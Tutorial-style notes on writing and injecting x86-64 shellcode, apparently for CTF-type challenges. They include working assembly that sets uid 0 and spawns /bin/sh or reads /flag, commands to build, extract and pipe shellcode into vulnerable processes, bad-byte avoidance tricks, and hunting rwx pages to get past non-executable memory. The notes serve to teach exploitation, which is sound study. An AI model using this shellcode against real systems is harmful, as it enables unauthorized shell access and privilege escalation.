# Shellcode Injection

## Resources

- [syscall.sh](https://syscall.sh/): Your cheat sheet for syscalls. A glance here, and you're always ahead.
- [Syscalls Manpage](https://man7.org/linux/man-pages/man2/syscalls.2.html): Understand not just the calls, but their deeper implications.
- [Felix Cloutier](https://www.felixcloutier.com/x86/): Dive into the heartbeats of instructions, ensuring you're always in step.
- [x86asm Reference:](http://ref.x86asm.net/coder64.html): Decode the bytes into moves, turning the tables on any challenge.
- [Debugging - Reverse Execution](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Reverse-Execution.html): GDB reverse execution manual
- [shell-storm](https://shell-storm.org/shellcode/index.html): Database a shellcode
- [Online x86/x64 assembler/disassembler](https://defuse.ca/online-x86-assembler.htm): Convert assembly into byte code
- [Shellcode Reduction Tips for x86](https://www.abatchy.com/2017/04/shellcode-reduction-tips-x86): Tips to reduce the size of shellcodes

## Writing Shellcode

Simple way to pop a shell:

```assembly
.global _start
_start:
.intel_syntax noprefix
        # setuid
        mov rax, 0x69
        mov rdi, 0
        syscall


        # pop shell with execve
        mov rax, 0x3b
        lea rdi, [rip+binsh]
        mov rsi, 0
        mov rdx, 0
        syscall

binsh:
        .string "/bin/sh"
```

There are other ways to represent strings in ASM such as hexadecimal:

```assembly
mov rbx, 0x0068732f6e69622f     # mov "/bin/sh\0" into rbx
push rbx                        # push "/bin/sh\0" onto the stack
mov rdi, rsp                    # point rdi at the stack
```

Another goal would be to read the flag:

```assembly
mov rbx, 0x00000067616c662f     # push "/flag" onto stack
push rbx
mov rax, 2                      # syscall for open
mov rdi, rsp                    # point the first argument at stack ("/flag")
mov rsi, 0                      # NULL second argument
syscall                         # open("/flag", NULL)

mov rdi, 1                      # out fd
mov rsi, rax                    # in fd
mov rdx, 0                      # offset
mov r10, 1000                   # count
mov rax, 40                     # syscall for sendfile
syscall                         # sendfile(1, N, 0, 1000)

mov rax, 60
syscall
```

## Building Shellcode

Assembling shellcode:

```bash
gcc -nostdlib -static shellcode.s -o shellcode-elf
```

Extracting shellcode:

```bash
objcopy --dump-section .text=shellcode-raw shellcode-elf
```

The resulting shellcode-raw file contains the raw bytes of your shellcode. This is what you would inject as part of your exploits. 

The ELF from before is very useful for testing your shellcode. 

```bash
gcc -nostdlib -static shellcode.s -o shellcode-elf
./shellcode-elf
```

Disassembling shellcode:

```bash
objdump -M intel -d shellcode-elf
```

Extract hexadecimal shellcode from objdump:

```bash
objdump -d shellcode-elf | grep "[0-9a-f]:" | grep -v "file" | cut -d ':' -f 2 | cut -d ' ' -f1-7 | tr -s ' ' | tr '\t' ' ' | sed 's/ $//g' | sed 's/ /\\x/g' | paste -d '' -s | sed 's/^/"/' | sed 's/$/"/g'
```

Sending shellcode to the stdin of a process (wiht user input afterwards):

```bash
cat shellcode-raw /dev/stdin | ./vulnerable_process
```

Strace a program with your shellcode as input:

```bash
cat shellcode-raw | strace ./vulnerable_process
```

To debug your shellcode, use `strace`

```bash
gcc -nostdlib -static shellcode.s -o shellcode-elf
strace ./shellcode-elf
```

You can also use `gdb`:

```bash
gdb ./shellcode-elf
r < shellcode-raw
```

Dump shellcode in raw format. Useful when injecting shellcode onto the stack via shellcode:

```bash
xxd -e -g 8 -c 8 shellcode-raw | awk '{print $2}' | sed 's/^/0x/g'
```

## Common Challenges

### Forbidden Bytes

Depending on the injection method, certain bytes might not be allowed. Some common issues:

| Byte (Hex Value) | Problematic Methods |
|------------------|---------------------|
| Null byte \0 (0x00) | strcpy |
| Newline \n (0x0a) | scanf gets getline fgets |
| Carriage return \r (0x0d) | scanf |
| Space (0x20) | scanf |
| Tab \t (0x09) | scanf |
| DEL (0x7f) | protocol specific |

You'll need to craft your instructions creatively by examining the bytes of the op-codes you are using:

| Filter | Bad | Good |
|--------|-----|------|
| no NULLs | mov rax, 0 (48c7c000000000) | xor rax, rax (4831c0) |
| no NULLs | mov rax, 5 (48c7c005000000) | xor rax, rax; mov al, 5 (4831c0b005) |
| no newlines | mov rax, 10 (48c7c00a000000) | mov rax, 9; inc rax (48c7c00900000048ffc0) |
| no NULLs | mov rbx, 0x67616c662f (48bbcf666c6167000000) | mov ebx, 0x67616c66; shl rbx, 8; mov bl, 0x2f (bb666c616748c1e308b32f) |
| printables | mov rax, rbx (4889d8) | push rbx, pop rax (5358, "SX")

### amd64 vs x86: system calls

amd64 uses the `syscall` instruction to dispatch a system call to the OS kernel.

x86 used the `int 0x80` instruction to trigger an interrupt that would be interpreted by the OS kernel as a system call.

### Memory Access Width

Be careful about sizes of memory accesses:

```
single byte:        mov [rax], bl
2-byte word:        mov [rax], bx
4-byte dword:       mov [rax], ebx
8-byte qword:       mov [rax], rbx
```

Sometimes, you might have to explicitly specify the size of avoid ambiguity:

```
single byte:        mov BYTE PTR [rax], 5
2-byte word:        mov WORD PTR [rax], 5
4-byte dword:       mov DWORD PTR [rax], 5
8-byte qword:       mov QWORD PTR [rax], 5
```

### Shellcode Mangling

Your shellcode might be mangled beyound recognition

- your shellcode might be sorted
- your shellcode might be compressed or uncompressed
- your shellcode might be encrypted or decrypted

Start from what you want your shellcode to look like when it's executed, and work backwards.

Parts of your shellcode might be uncontrollable. YOu can jump over these parts to avoid them.

## Data Execution Prevention

Modern architectures support memory permissions:

- PROT_READ allows the process to read memory
- PROT_WRITE allows the process to write memory
- PROT_EXEC allows the process to execute memory

By default in modern systems, the stack and heap are not executable.

### de-protecting memory

Memory can be made executable using the `mprotect()` system call:

1. Trick the program into `mprotect(PROT_EXEC)ing` our shellcode
2. Jump to the shellcode

How do we do #1? Most common way is code reuse through Return Oriented Programming.

### JIT

Just in Time Compilation
- JIT compilers need to generate (and frequently re-generate) code that is executed
- Pages must be writable for code generation
- Pages must be executable for execution
- Pages must be writable for code re-generation

The safe thing to do would be to:
- `mmap(PROT_READ|PROT_WRITE)`
- write the code
- `mprotect(PROT_READ|PROT_EXEC)`
- execute
- `mprotect(PROT_READ|PROT_WRITE)`
- update the code
- etc...

However, this is extremely slow. Writable AND executable pages are common.

If your binary uses a library that has a writable+executable page, that page lives in your memory space.

```bash
cd /proc                                            # there we have directories for all the processes running on the machine
cat self/maps                                       # self is a link to my current process id
ls -ld self
grep -l rwx */maps                                  # see files that match these permissions
grep -l rwx */maps | parallel "ls -l {//}/exe"      # get the xxx/exe and all of the programs have a pages mapped in memory that is writable and executable
cat xxx/maps
grep rwx xxx/maps
```